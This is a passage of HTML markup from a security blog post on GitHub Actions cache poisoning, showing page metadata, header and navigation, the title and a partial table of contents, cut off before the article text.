var(--wp--preset--spacing--40);}.wp-container-core-group-is-layout-13{flex-wrap:nowrap;justify-content:space-between;}.wp-container-core-group-is-layout-15 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-is-layout-15 > * + *{margin-block-start:var(--wp--preset--spacing--50);margin-block-end:0;}.wp-container-core-social-links-is-layout-2{justify-content:center;}.wp-container-core-group-is-layout-16 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-is-layout-16 > * + *{margin-block-start:8px;margin-block-end:0;}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-90-1" href="https://s0.wp.com/wp-content/mu-plugins/jetpack-mu-wpcom-plugin/sun/vendor/automattic/jetpack-mu-wpcom/src/build/verbum-comments/verbum-comments.css?m=1709133875i&amp;cssminify=yes" type="text/css" media="all">
<link rel="stylesheet" id="verbum-gutenberg-css-css" href="https://widgets.wp.com/verbum-block-editor/block-editor.css?ver=1717067639" media="all">
<link crossorigin="anonymous" rel="stylesheet" id="all-css-92-1" href="https://s0.wp.com/_static/??-eJx9TkkOwjAM/BDGSkGUC+ItbWSCIYmjLKr4PS5IUEDiNjOexTglsBIrxYqhQfLNcSxoJQSVwPOVlJUvZa3KChmjVNZ0eYHnYdFZzxS0IbURbaahskCHpd48/VgX844EvNjZHj8InPzA+V800+jFKXSPt990Dh3DwfSmM7t+u9lf7vI+XV4=&amp;cssminify=yes" type="text/css" media="all">
<style id="jetpack-global-styles-frontend-style-inline-css">
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-94-1" href="https://s0.wp.com/_static/??-eJyNjcsKQjEMBX/ImlsQry7ET5GahrbXNCmmRfx7H7gRN+7OwGEGbs2hSifpUIdrPFIRg4V6C3j5MNgQqBoHk4HlcKUYYry/Z5G0RrMV/C06FUEwxRLYsSa1L/iR9Uz1mc0bSKznwK/DsR787Kd5P/ntbnkAuNBIYA==&amp;cssminify=yes" type="text/css" media="all">
<script id="media-video-jwt-bridge-js-extra">
var videopressAjax = {"ajaxUrl":"https:\/\/adnanthekhancom.wordpress.com\/wp-admin\/admin-ajax.php","bridgeUrl":"\/wp-content\/mu-plugins\/jetpack-plugin\/sun\/jetpack_vendor\/automattic\/jetpack-videopress\/build\/lib\/token-bridge.js","post_id":"454"};
</script>
<script id="wpcom-actionbar-placeholder-js-extra">
var actionbardata = {"siteID":"227025655","postID":"454","siteURL":"https:\/\/adnanthekhan.com","xhrURL":"https:\/\/adnanthekhan.com\/wp-admin\/admin-ajax.php","nonce":"d3633abac5","isLoggedIn":"","statusMessage":"","subsEmailDefault":"instantly","proxyScriptUrl":"https:\/\/s0.wp.com\/wp-content\/js\/wpcom-proxy-request.js?ver=20211021","shortlink":"https:\/\/wp.me\/pfmzK7-7k","i18n":{"followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/read\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar"}};
</script>
<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJxdjUEOwjAMBD9EMHCo6AHxFJQ0pnJI7Ch2CvyeHgAJjjs70sC9uknYkA2SQpFAGV1XbH5emSO+yjbpBn69ls3VJo/n/1e6q7nPxAoJrfrp9t6gnT/osiBHaeC7SfFmNH3lhSJKbagKoVOOkCmAyQ3ZhUZxxjV4Lqf9MI7jcTgMu/QCAG9ILQ=="></script>
<script id="rlt-proxy-js-after">
	window.addEventListener( 'DOMContentLoaded', function() {
		rltInitialize( {"token":null,"iframeOrigins":["https:\/\/widgets.wp.com"]} );
	} );
</script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://adnanthekhancom.wordpress.com/xmlrpc.php?rsd">
<meta name="generator" content="WordPress.com">
<link rel="canonical" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/comment-page-1/#comments">
<link rel="shortlink" href="https://wp.me/pfmzK7-7k">
<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Fadnanthekhan.com%2F2024%2F05%2F06%2Fthe-monsters-in-your-build-cache-github-actions-cache-poisoning%2F&amp;for=wpcom-auto-discovery"><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Fadnanthekhan.com%2F2024%2F05%2F06%2Fthe-monsters-in-your-build-cache-github-actions-cache-poisoning%2F&amp;for=wpcom-auto-discovery">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article">
<meta property="og:title" content="The Monsters in Your Build Cache – GitHub Actions Cache Poisoning">
<meta property="og:url" content="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/">
<meta property="og:description" content="GitHub Actions caching has some insecure design decisions that allow for some unique attacks. It’s considered working as intended, but there are many ways it can go wrong. Learn how I identif…">
<meta property="article:published_time" content="2024-05-06T09:41:00+00:00">
<meta property="article:modified_time" content="2024-05-06T14:11:52+00:00">
<meta property="og:site_name" content="Adnan Khan's Blog">
<meta property="og:image" content="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png">
<meta property="og:image:width" content="1024">
<meta property="og:image:height" content="1024">
<meta property="og:image:alt" content="">
<meta property="og:locale" content="en_US">
<meta property="article:publisher" content="https://www.facebook.com/WordPresscom">
<meta name="twitter:text:title" content="The Monsters in Your Build Cache – GitHub Actions Cache&nbsp;Poisoning">
<meta name="twitter:image" content="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=640">
<meta name="twitter:card" content="summary_large_image">

<!-- End Jetpack Open Graph Tags -->
<link rel="search" type="application/opensearchdescription+xml" href="https://adnanthekhan.com/osd.xml" title="Adnan Khan's Blog">
<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com">
<script id="wp-load-polyfill-importmap">
( HTMLScriptElement.supports && HTMLScriptElement.supports("importmap") ) || document.write( '<script src="https://s0.wp.com/wp-includes/js/dist/vendor/wp-polyfill-importmap.min.js?m=1710866488i&#038;ver=1.8.2"></scr' + 'ipt>' );
</script>
<script type="importmap" id="wp-importmap">
{"imports":{"@wordpress\/interactivity":"https:\/\/s0.wp.com\/wp-content\/plugins\/gutenberg-core\/v18.4.1\/build\/interactivity\/index.min.js?ver=18.4.1"}}
</script>
<script type="module" src="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/interactivity/navigation.min.js?ver=18.4.1" id="@wordpress/block-library/navigation-js-module"></script>
<link rel="modulepreload" href="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/interactivity/index.min.js?ver=18.4.1" id="@wordpress/interactivity-js-modulepreload"><meta name="application-name" content="Adnan Khan's Blog"><meta name="msapplication-window" content="width=device-width;height=device-height"><meta name="msapplication-tooltip" content="Red Teaming, CI/CD Security, and more"><meta name="description" content="GitHub Actions caching has some insecure design decisions that allow for some unique attacks. It's considered working as intended, but there are many ways it can go wrong. Learn how I identified Actions cache poisoning vulnerabilities in a handful of open-source projects.">
<style id="wp-fonts-local">
@font-face{font-family:Roboto;font-style:normal;font-weight:100;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOkCnqEu92Fr1MmgWxKKTM1K9nz.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:italic;font-weight:100;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOiCnqEu92Fr1Mu51QrIzIXLsnzjYk.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:normal;font-weight:300;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOlCnqEu92Fr1MmSU5vBh05IsDqlA.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:italic;font-weight:300;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOjCnqEu92Fr1Mu51TjARc4AMX6lJBP.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:normal;font-weight:400;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOmCnqEu92Fr1Me4GZLCzYlKw.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:italic;font-weight:400;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOkCnqEu92Fr1Mu52xKKTM1K9nz.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:normal;font-weight:500;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9vBh05IsDqlA.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:italic;font-weight:500;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOjCnqEu92Fr1Mu51S7ABc4AMX6lJBP.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:normal;font-weight:700;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlvBh05IsDqlA.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:italic;font-weight:700;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOjCnqEu92Fr1Mu51TzBhc4AMX6lJBP.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:normal;font-weight:900;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOlCnqEu92Fr1MmYUtvBh05IsDqlA.woff2') format('woff2');}
@font-face{font-family:Roboto;font-style:italic;font-weight:900;font-display:fallback;src:url('https://fonts.wp.com/s/roboto/v30/KFOjCnqEu92Fr1Mu51TLBBc4AMX6lJBP.woff2') format('woff2');}
@font-face{font-family:"Space Mono";font-style:normal;font-weight:400;font-display:fallback;src:url('https://fonts.wp.com/s/spacemono/v13/i7dPIFZifjKcF5UAWdDRUEN2RFq7AwU.woff2') format('woff2');}
@font-face{font-family:"Space Mono";font-style:italic;font-weight:400;font-display:fallback;src:url('https://fonts.wp.com/s/spacemono/v13/i7dNIFZifjKcF5UAWdDRYER8RXi-EwWMbg.woff2') format('woff2');}
@font-face{font-family:"Space Mono";font-style:normal;font-weight:700;font-display:fallback;src:url('https://fonts.wp.com/s/spacemono/v13/i7dMIFZifjKcF5UAWdDRaPpZYFeQHwyVd3U.woff2') format('woff2');}
@font-face{font-family:"Space Mono";font-style:italic;font-weight:700;font-display:fallback;src:url('https://fonts.wp.com/s/spacemono/v13/i7dSIFZifjKcF5UAWdDRYERE_FeaHi6QZ3WfYg.woff2') format('woff2');}
</style>
<link rel="icon" href="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=32" sizes="32x32">
<link rel="icon" href="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=192" sizes="192x192">
<link rel="apple-touch-icon" href="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=180">
<meta name="msapplication-TileImage" content="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=270">
<!-- Your Google Analytics Plugin is missing the tracking ID -->
<link rel="stylesheet" type="text/css" href="https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b"><link rel="stylesheet" type="text/css" href="https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414i&amp;amp;ver=3.0.9b"><link rel="stylesheet" id="gravatar-card-css" href="https://0.gravatar.com/js/hovercards/hovercards.min.css?ver=2024244cee4591fae4bea45ee2571078613ea2fab8a404a7b5ceb1cf2b511ebc67fadd"><link href="https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.css?v=20240115" type="text/css" rel="stylesheet"></head>

<body class="post-template-default single single-post postid-454 single-format-standard wp-custom-logo wp-embed-responsive customizer-styles-applied jetpack-reblog-enabled">

<a class="skip-link screen-reader-text" href="#wp--skip-link--target">Skip to content</a><div class="wp-site-blocks"><header class="wp-block-template-part">
<div class="wp-block-group alignfull has-background-color has-primary-background-color has-text-color has-background has-link-color wp-elements-7cf85e8acea8fb751b878283f7cbee06 has-global-padding is-layout-constrained wp-container-core-group-is-layout-3 wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--40);padding-right:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--50)">
<div class="wp-block-columns alignfull is-layout-flex wp-container-core-columns-is-layout-1 wp-block-columns-is-layout-flex" style="padding-right:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--50)">
<div class="wp-block-column is-vertically-aligned-center is-layout-flow wp-block-column-is-layout-flow" style="padding-right:0;padding-left:0;flex-basis:21.5%">
<ul class="wp-block-social-links aligncenter has-small-icon-size has-icon-color is-style-logos-only is-content-justification-center is-layout-flex wp-container-core-social-links-is-layout-1 wp-block-social-links-is-layout-flex"><li style="color: #ffffff; " class="wp-social-link wp-social-link-linkedin has-background-color wp-block-social-link"><a href="https://www.linkedin.com/in/adnanekhan" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M19.7,3H4.3C3.582,3,3,3.582,3,4.3v15.4C3,20.418,3.582,21,4.3,21h15.4c0.718,0,1.3-0.582,1.3-1.3V4.3 C21,3.582,20.418,3,19.7,3z M8.339,18.338H5.667v-8.59h2.672V18.338z M7.004,8.574c-0.857,0-1.549-0.694-1.549-1.548 c0-0.855,0.691-1.548,1.549-1.548c0.854,0,1.547,0.694,1.547,1.548C8.551,7.881,7.858,8.574,7.004,8.574z M18.339,18.338h-2.669 v-4.177c0-0.996-0.017-2.278-1.387-2.278c-1.389,0-1.601,1.086-1.601,2.206v4.249h-2.667v-8.59h2.559v1.174h0.037 c0.356-0.675,1.227-1.387,2.526-1.387c2.703,0,3.203,1.779,3.203,4.092V18.338z"></path></svg><span class="wp-block-social-link-label screen-reader-text">LinkedIn</span></a></li>

<li style="color: #ffffff; " class="wp-social-link wp-social-link-x has-background-color wp-block-social-link"><a href="https://x.com/adnanthekhan" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M13.982 10.622 20.54 3h-1.554l-5.693 6.618L8.745 3H3.5l6.876 10.007L3.5 21h1.554l6.012-6.989L15.868 21h5.245l-7.131-10.378Zm-2.128 2.474-.697-.997-5.543-7.93H8l4.474 6.4.697.996 5.815 8.318h-2.387l-4.745-6.787Z"></path></svg><span class="wp-block-social-link-label screen-reader-text">X</span></a></li>

<li style="color: #ffffff; " class="wp-social-link wp-social-link-github has-background-color wp-block-social-link"><a href="https://github.com/AdnaneKhan" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M12,2C6.477,2,2,6.477,2,12c0,4.419,2.865,8.166,6.839,9.489c0.5,0.09,0.682-0.218,0.682-0.484 c0-0.236-0.009-0.866-0.014-1.699c-2.782,0.602-3.369-1.34-3.369-1.34c-0.455-1.157-1.11-1.465-1.11-1.465 c-0.909-0.62,0.069-0.608,0.069-0.608c1.004,0.071,1.532,1.03,1.532,1.03c0.891,1.529,2.341,1.089,2.91,0.833 c0.091-0.647,0.349-1.086,0.635-1.337c-2.22-0.251-4.555-1.111-4.555-4.943c0-1.091,0.39-1.984,1.03-2.682 C6.546,8.54,6.202,7.524,6.746,6.148c0,0,0.84-0.269,2.75,1.025C10.295,6.95,11.15,6.84,12,6.836 c0.85,0.004,1.705,0.114,2.504,0.336c1.909-1.294,2.748-1.025,2.748-1.025c0.546,1.376,0.202,2.394,0.1,2.646 c0.64,0.699,1.026,1.591,1.026,2.682c0,3.841-2.337,4.687-4.565,4.935c0.359,0.307,0.679,0.917,0.679,1.852 c0,1.335-0.012,2.415-0.012,2.741c0,0.269,0.18,0.579,0.688,0.481C19.138,20.161,22,16.416,22,12C22,6.477,17.523,2,12,2z"></path></svg><span class="wp-block-social-link-label screen-reader-text">GitHub</span></a></li>

<li style="color: #ffffff; " class="wp-social-link wp-social-link-mail has-background-color wp-block-social-link"><a href="mailto:me@adnanthekhan.com" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M19,5H5c-1.1,0-2,.9-2,2v10c0,1.1.9,2,2,2h14c1.1,0,2-.9,2-2V7c0-1.1-.9-2-2-2zm.5,12c0,.3-.2.5-.5.5H5c-.3,0-.5-.2-.5-.5V9.8l7.5,5.6,7.5-5.6V17zm0-9.1L12,13.6,4.5,7.9V7c0-.3.2-.5.5-.5h14c.3,0,.5.2.5.5v.9z"></path></svg><span class="wp-block-social-link-label screen-reader-text">Mail</span></a></li></ul>
</div>



<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow"></div>



<div class="wp-block-column is-vertically-aligned-center is-layout-flow wp-block-column-is-layout-flow" style="padding-right:3vw;padding-left:3vw;flex-basis:21%">
<div class="wp-block-group is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-1 wp-block-group-is-layout-flex"><form role="search" method="get" action="https://adnanthekhan.com/" class="wp-block-search__button-inside wp-block-search__icon-button wp-block-search wp-container-content-2"><label class="wp-block-search__label screen-reader-text" for="wp-block-search__input-1" style="font-size: 0.87rem">Search</label><div class="wp-block-search__inside-wrapper has-border-color" style="border-width: 1px;border-color: #4a4a4a"><input class="wp-block-search__input" id="wp-block-search__input-1" placeholder="Search" value="" type="search" name="s" required="" style="border-radius: 0px;font-size: 0.87rem"><button aria-label="Search" class="wp-block-search__button has-icon wp-element-button" type="submit" style="border-radius: 0px;font-size: 0.87rem"><svg class="search-icon" viewBox="0 0 24 24" width="24" height="24">
					<path d="M13 5c-3.3 0-6 2.7-6 6 0 1.4.5 2.7 1.3 3.7l-3.8 3.8 1.1 1.1 3.8-3.8c1 .8 2.3 1.3 3.7 1.3 3.3 0 6-2.7 6-6S16.3 5 13 5zm0 10.5c-2.5 0-4.5-2-4.5-4.5s2-4.5 4.5-4.5 4.5 2 4.5 4.5-2 4.5-4.5 4.5z"></path>
				</svg></button></div></form></div>
</div>
</div>


<div class="aligncenter wp-block-site-logo"><a href="https://adnanthekhan.com/" class="custom-logo-link" rel="home"><img width="63" height="63" src="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png" class="custom-logo" alt="Adnan Khan's Blog" decoding="async" data-attachment-id="35" data-permalink="https://adnanthekhan.com/aklogo/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="aklogo" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=512"></a></div>

<h1 class="has-text-align-center alignwide wp-block-site-title"><a href="https://adnanthekhan.com" target="_self" rel="home">Adnan Khan's Blog</a></h1>


<div class="wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="border-top-color:#fafafa54;border-top-style:solid;border-top-width:1px;margin-top:1.5rem;padding-top:1rem;padding-bottom:1rem"><nav class="is-responsive items-justified-center wp-block-navigation is-content-justification-center is-layout-flex wp-container-core-navigation-is-layout-1 wp-block-navigation-is-layout-flex" aria-label="Navigation" data-wp-interactive="core/navigation" data-wp-context="{&quot;overlayOpenedBy&quot;:{&quot;click&quot;:false,&quot;hover&quot;:false,&quot;focus&quot;:false},&quot;type&quot;:&quot;overlay&quot;,&quot;roleAttribute&quot;:&quot;&quot;,&quot;ariaLabel&quot;:&quot;Menu&quot;}"><button aria-haspopup="dialog" aria-label="Open menu" class="wp-block-navigation__responsive-container-open " data-wp-on--click="actions.openMenuOnClick" data-wp-on--keydown="actions.handleMenuKeydown"><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><rect x="4" y="7.5" width="16" height="1.5"></rect><rect x="4" y="15" width="16" height="1.5"></rect></svg></button>
				<div class="wp-block-navigation__responsive-container  " style="" id="modal-3" data-wp-class--has-modal-open="state.isMenuOpen" data-wp-class--is-menu-open="state.isMenuOpen" data-wp-watch="callbacks.initMenu" data-wp-on--keydown="actions.handleMenuKeydown" data-wp-on--focusout="actions.handleMenuFocusout" tabindex="-1">
					<div class="wp-block-navigation__responsive-close" tabindex="-1">
						<div class="wp-block-navigation__responsive-dialog" data-wp-bind--aria-modal="state.ariaModal" data-wp-bind--aria-label="state.ariaLabel" data-wp-bind--role="state.roleAttribute">
							<button aria-label="Close menu" class="wp-block-navigation__responsive-container-close" data-wp-on--click="actions.closeMenuOnClick"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" focusable="false"><path d="M13 11.8l6.1-6.3-1-1-6.1 6.2-6.1-6.2-1 1 6.1 6.3-6.5 6.7 1 1 6.5-6.6 6.5 6.6 1-1z"></path></svg></button>
							<div class="wp-block-navigation__responsive-container-content" data-wp-watch="callbacks.focusFirstElement" id="modal-3-content">
								<ul class="wp-block-navigation__container is-responsive items-justified-center wp-block-navigation"><ul class="wp-block-page-list"><li class="wp-block-pages-list__item wp-block-navigation-item open-on-hover-click"><a class="wp-block-pages-list__item__link wp-block-navigation-item__content" href="https://adnanthekhan.com/about/">About Me</a></li><li class="wp-block-pages-list__item wp-block-navigation-item open-on-hover-click"><a class="wp-block-pages-list__item__link wp-block-navigation-item__content" href="https://adnanthekhan.com/blog/">Blog</a></li></ul></ul>
							</div>
						</div>
					</div>
				</div></nav></div>
</div>
</header>


<main class="wp-block-group is-layout-flow wp-container-core-group-is-layout-15 wp-block-group-is-layout-flow" style="margin-top:var(--wp--preset--spacing--70);margin-bottom:var(--wp--preset--spacing--70)" id="wp--skip-link--target">
<div class="wp-block-group has-global-padding is-layout-constrained wp-container-core-group-is-layout-8 wp-block-group-is-layout-constrained">
	<div class="wp-block-template-part">
<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-group is-content-justification-center is-nowrap is-layout-flex wp-container-core-group-is-layout-5 wp-block-group-is-layout-flex">
<div class="wp-block-group has-tertiary-background-color has-background is-content-justification-center is-layout-flex wp-container-core-group-is-layout-4 wp-block-group-is-layout-flex" style="border-radius:4px"><div style="font-size:0.8rem;padding-top:6px;padding-right:6px;padding-bottom:6px;padding-left:6px" class="taxonomy-category wp-block-post-terms"><a href="https://adnanthekhan.com/category/security/bug-bounty/" rel="tag">bug-bounty</a><span class="wp-block-post-terms__separator">, </span><a href="https://adnanthekhan.com/category/cicd/" rel="tag">cicd</a><span class="wp-block-post-terms__separator">, </span><a href="https://adnanthekhan.com/category/github/" rel="tag">github</a><span class="wp-block-post-terms__separator">, </span><a href="https://adnanthekhan.com/category/security/supplychain/" rel="tag">supplychain</a></div></div>
</div>
</div>
</div>
	<h2 class="has-text-align-center wp-block-post-title has-xxx-large-font-size">The Monsters in Your Build Cache – GitHub Actions Cache&nbsp;Poisoning</h2>
	<div class="wp-block-template-part">
<div class="wp-block-group is-content-justification-center is-nowrap is-layout-flex wp-container-core-group-is-layout-7 wp-block-group-is-layout-flex" style="padding-bottom:20px;font-size:x-small">
<p class="has-x-small-font-size">Published by</p>


<div class="wp-block-post-author has-x-small-font-size"><div class="wp-block-post-author__content"><p class="wp-block-post-author__name">adnanthekhan</p></div></div>


<p class="has-x-small-font-size">on</p>


<div class="wp-block-post-date"><time datetime="2024-05-06T05:41:00-04:00"><a href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/">May 6, 2024</a></time></div></div>
</div>
<figure class="wp-block-post-featured-image"><img width="1024" height="1024" src="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=1024" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" style="object-fit:cover;" data-attachment-id="522" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/designer/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png" data-orig-size="1024,1024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="designer" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=1024"></figure></div>



<div class="wp-block-group is-layout-flow wp-block-group-is-layout-flow"><div class="entry-content wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained"><div class="wp-block-post-time-to-read">28 minutes</div>


<ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#introduction">Introduction</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#how-does-github-actions-caching-really-work">How Does GitHub Actions Caching Really Work?</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#cache-save-process">Cache Save Process</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#cache-upload-process">Cache Upload Process</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#6-hour-attack-window">6 Hour Attack Window</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#cache-restoration-process">Cache Restoration Process</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#actions-cache">actions/cache</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#cache-hierarchy">Cache Hierarchy</a></li></ol></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#cache-blasting-and-poisoning">Cache Blasting and Poisoning</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#steal-the-cache-token">Steal the Cache Token</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#payload-creation-overwrite-anything">Payload Creation – Overwrite Anything</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#squatting-on-cache-entries">Squatting on Cache Entries</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#restore-keys">Restore Keys</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#anticipating-cache-keys">Anticipating Cache Keys</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#blasting-the-cache">Blasting the Cache</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#poc-time">PoC Time</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#finding-an-injection-point">Finding an Injection Point</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#setting-the-trap">Setting the Trap</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#don-t-accidentally-break-everything">Don’t Accidentally Break Everything!</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#angular">Angular</a><ol><li><a class="wp-block-table-of-contents__entry" 